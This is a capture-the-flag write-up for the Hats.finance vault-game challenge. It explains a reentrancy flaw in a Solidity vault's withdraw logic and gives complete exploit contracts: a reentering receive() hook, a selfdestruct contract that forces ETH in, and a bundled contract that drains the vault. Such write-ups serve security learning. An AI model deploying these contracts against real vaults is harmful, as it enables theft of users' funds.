
# Hats.finance CTF #2 writeup

Challenge : https://github.com/hats-finance/vault-game

Type of Attack : Re-entrancy attack
Vulnerability level : Critical, The vault could be drained, rendering the wrapped token worthless. 

# Finding the vulnerability

 1. Since we need to drain the contract of ETH, we will look for vulnerabilities in functions with `payable` extension, specifically functions that sends ETH to users, This left us with two functions, `withdraw()` and `redeem()`, both function execute an internal function called `_withdraw()`.
 2. Looking at the `_withdraw()` function, we didn't see any reentrancy guard, and the code sends eth to users first(Transfer to unknown address) before doing the rebalance of excessETH (Transfer to trusted address). So this is a reentrancy vulnerability.
```js
function  _withdraw(address  caller, address  payable receiver,address  _owner,uint256  amount) internal  virtual{
	if (caller != _owner) {
		_spendAllowance(_owner, caller, amount);
	}
	uint256 excessETH = totalAssets() - totalSupply();

	_burn(_owner, amount);
	Address.sendValue(receiver, amount);
	if (excessETH > 0) {
		Address.sendValue(payable(owner()), excessETH);
	}
	emit  Withdraw(caller, receiver, _owner, amount, amount);
}
```
 3. In the reentrancy contract we will need to trigger a second withdraw, so the excessETH from the first withdraw will be double-counted. Therefore, draining the vault's ETH.

# The Reentrancy contract
```js
contract Reentrancy{
	victim VictimContract;
	address creator;
	constructor(address  target, address  _creator) payable {
		VictimContract = victim(target);
		creator = _creator;
	}
	receive() external  payable {
			VictimContract.withdraw(1  ether, 0x4ce813AE26a83b757572a3463f97C9FB6e51Fa7d, creator);
			//0x4ce813AE..... is just a random non-contract address
	}
}
```
# Executing the attack

 1. First of all, we need to create an imbalance between the amount of Wrapped token and ETH, sadly this contract doesn't have any receive function, which means you can't send ETH to the contract in the normal way. But we still can fund a new contract and call `selfdestruct()`to the vault contract, during `selfdestruct()` all ETH on the contract will be forcefully transferred to the recipient, any address, including contracts, can't reject the ETH sent through `selfdestruct()`.

The Self Destruct contract : 
```js
contract Selfdes{
	constructor(address  target) payable {
		selfdestruct(payable(target));
	}
}
```
Implementation :
```js
function  forceSend(uint  amount) public  returns (address){
	Selfdes temp = (new Selfdes){value:amount}(address(VictimContract));
	return  address(temp);
}
```
 2.   Since we need to exploit through `withdraw()` function, we must deposit some of ETH to the Wrapped Token. In this case we will deposit 2 ETH.
 3.  We need to approve the reentrancy contract to spend and withdraw our wrapped tokens, in this case we will approve 1 Wrapped Token for the attacker.
 4. We need to withdraw our remaining 1 Wrapped Token to trigger the attack.
 5. Finally we capture the flag.

We can bundle all of that process into a single contract

```js
contract Exploit{
	victim targetContract;
	function  forceSend(uint  amount) public  returns (address){
		Selfdes temp = (new Selfdes){value:amount}(address(targetContract));
		return  address(temp);
	}
	constructor(address  target) payable {
		require(msg.value == 3  ether, "Must init contract with 3 ETH");
		targetContract = victim(target);
		Reentrancy attacker = new  Reentrancy(target, address(this));
		forceSend(1  ether);
		targetContract.deposit{value: 2  ether}(2  ether, address(this));
		targetContract.approve(address(attacker), 1  ether);
		targetContract.withdraw(1  ether, address(attacker), address(this));
		targetContract.captureTheFlag(address(this));
	}
}
```

further source code can be found at https://github.com/Firdausfarul/CTF2-Hats

# Running
```shell
npx hardhat node
npx hardhat run --network localhost scripts/deploy.js
```
